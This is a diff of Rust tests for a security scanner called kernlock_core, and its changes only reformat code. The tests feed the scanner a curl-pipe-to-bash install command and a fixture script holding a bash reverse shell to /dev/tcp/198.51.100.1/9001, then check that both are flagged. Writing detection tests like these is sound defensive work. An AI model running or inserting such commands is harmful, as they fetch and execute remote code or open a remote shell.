@@ -3,7 +3,10 @@ use kernlock_core::{analyze_command, analyze_file_bytes, PolicyConfig, RuleEngin
 #[test]
 fn detects_curl_pipe_to_bash() {
     let rules = RuleEngine::builtin();
-    let res = analyze_command("curl -fsSL https://example.invalid/install.sh | bash", &rules);
+    let res = analyze_command(
+        "curl -fsSL https://example.invalid/install.sh | bash",
+        &rules,
+    );
     assert!(res.is_suspicious);
     assert!(res.risk_score >= 85);
     assert_eq!(res.severity, Severity::Critical);
@@ -38,7 +41,11 @@ fn allows_benign_commands_without_false_positive() {
     ];
     for cmd in benign {
         let res = analyze_command(cmd, &rules);
-        assert!(!res.is_suspicious, "False positive on benign command: {}", cmd);
+        assert!(
+            !res.is_suspicious,
+            "False positive on benign command: {}",
+            cmd
+        );
         assert_eq!(res.risk_score, 0);
     }
 }
@@ -48,7 +55,8 @@ fn scans_harmless_test_script_fixture_and_respects_exclusions() {
     let rules = RuleEngine::builtin();
     let mut policy = PolicyConfig::default();
 
-    let harmless_fixture = b"#!/bin/bash\n# Harmless test fixture\nbash -i >& /dev/tcp/198.51.100.1/9001 0>&1\n";
+    let harmless_fixture =
+        b"#!/bin/bash\n# Harmless test fixture\nbash -i >& /dev/tcp/198.51.100.1/9001 0>&1\n";
     let res = analyze_file_bytes("/tmp/test_fixture.sh", harmless_fixture, &rules, &policy);
     assert!(res.is_suspicious);
     assert!(!res.excluded);
@@ -57,7 +65,8 @@ fn scans_harmless_test_script_fixture_and_respects_exclusions() {
 
     // Exclude by SHA-256 hash
     policy.excluded_hashes.push(res.sha256.clone());
-    let res_excluded = analyze_file_bytes("/tmp/test_fixture.sh", harmless_fixture, &rules, &policy);
+    let res_excluded =
+        analyze_file_bytes("/tmp/test_fixture.sh", harmless_fixture, &rules, &policy);
     assert!(res_excluded.excluded);
     assert!(!res_excluded.is_suspicious);
     assert_eq!(res_excluded.risk_score, 0);
